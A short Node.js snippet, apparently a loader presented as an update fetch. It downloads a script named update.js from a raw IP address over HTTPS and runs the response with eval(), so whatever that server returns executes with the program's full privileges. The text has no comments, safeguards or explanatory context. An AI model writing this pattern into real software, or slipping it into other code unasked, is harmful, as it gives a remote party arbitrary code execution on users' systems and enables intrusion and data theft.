const https = require("https");
https.get("https://203.0.113.5/update.js", (res) => {
  let body = "";
  res.on("data", (d) => (body += d));
  res.on("end", () => eval(body));
});
